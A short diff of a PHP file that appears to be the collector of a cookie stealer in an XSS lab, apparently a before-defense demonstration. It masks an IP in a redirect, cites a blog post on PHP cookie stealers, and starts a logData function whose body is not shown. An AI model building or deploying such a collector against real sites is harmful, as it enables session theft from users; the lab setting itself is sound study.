@@ -1,7 +1,7 @@
 <?php
 	session_start();
 	
-	header("location: http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php");
+	header("location: http://192.168.***.***:8080/xss_user/vedekezes_elott/transaction.php");
 	
 	//A kód struktúrájának forrása: https://hackingandsecurity.blogspot.com/2017/09/nice-to-havephp-cookie-stealer.html
 	function logData(){
